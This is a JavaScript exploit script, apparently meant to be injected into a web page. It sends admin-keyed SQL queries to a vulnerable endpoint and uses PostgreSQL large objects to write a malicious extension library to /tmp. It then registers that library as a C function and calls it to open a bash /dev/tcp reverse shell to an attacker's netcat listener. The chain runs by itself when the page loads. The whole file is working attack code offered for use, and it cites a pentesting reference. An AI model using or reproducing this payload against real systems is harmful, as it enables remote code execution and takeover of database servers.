var nc_ip = "192.168.1.XXX"; //Attacker's netcat listener IP
var nc_port = "4444"; //Attacker's netcat listener port
var url= "/vulnerable-path";
var loid = 1337;

var udf="<Add the database extension hex code here >"; //xxd rev_shell.dll | cut -d" " -f 2-9 | sed 's/ //g' | tr -d '\n' > rev_shell.dll.txt

//Reference: https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions

function make_request(url, body){
    var resp;

    $.ajax({
        url : url,
        type : "POST",
        data: body,
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        async: false,
        success : function(responseText) {
            resp = responseText;
        }
     });

return resp;
}

function delete_lo() {
    console.log("[+] Deleting existing LO...");
    body="adminKey="+admin_key+"&query=SELECT+lo_unlink%28"+loid+"%29";
    make_request(url, body);
}

function create_lo() {
    console.log("[+] Creating LO for UDF injection...");
    body = "adminKey="+admin_key+"&query=SELECT+lo_import($$//etc//hostname$$,"+loid+")"; //Linux specific path
    make_request(url, body);
}

function inject_udf(){
   console.log("[+] Injecting payload of length %d into LO...");

   for ( let i = 0; i < ((udf.length-1)/4096)+1; i++ ){
         var udf_chunk = udf.substring(i*4096,(i+1)*4096);
         if(i == 0){
            body = "adminKey="+admin_key+"&query=UPDATE+PG_LARGEOBJECT+SET+data=decode($$"+udf_chunk+"$$,$$hex$$)+where+loid="+loid+"+and+pageno="+i+"";
         }
          else{
            body = "adminKey="+admin_key+"&query=INSERT+INTO+PG_LARGEOBJECT+(loid,pageno,data)+VALUES+("+loid+","+i+",decode($$"+udf_chunk+"$$,$$hex$$))";
          }

    make_request(url, body);
        }
}

function export_udf() {
    console.log("[+] Exporting UDF library to filesystem...");
    body = "adminKey="+admin_key+"&query=SELECT+lo_export("+loid+",$$//tmp//rev_shell.obj$$)";
    make_request(url, body);
}

function create_udf_func() {
    console.log("[+] Creating function...");
    body = "adminKey="+admin_key+"&query=CREATE+FUNCTION+sys(cstring)+RETURNS+int+AS+'//tmp//rev_shell.obj',+'pg_exec'+LANGUAGE+C+STRICT"; 
    make_request(url, body);
}

function trigger_udf() {
    console.log("[+] Launching reverse shell...");
    body = "adminKey="+admin_key+"&query=SELECT+sys('bash+-c+\"bash+-i+>%26+/dev/tcp/"+nc_ip+"/"+nc_port+"+0>%261\"')";
    make_request(url, body);
}

function launch(){
    delete_lo();
    create_lo();
    inject_udf();
    export_udf();
    create_udf_func();
    trigger_udf();
}

//Slight dealay to let jquery load
setTimeout(launch,50);